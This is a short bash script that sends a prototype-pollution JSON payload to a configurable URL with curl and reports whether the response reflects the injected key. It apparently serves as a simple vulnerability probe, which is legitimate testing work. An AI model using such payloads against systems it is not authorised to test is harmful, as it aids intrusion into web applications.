#!/bin/bash

url="$domain$" #change it
payload='{"__proto__.test":true}'
response=$(curl -s -H "Content-Type: application/json" -X POST --data "$payload" "$url")

if [[ $response == *"\"__proto__.test\":true"* ]]; then
    echo "True"
else
    echo "False"
fi
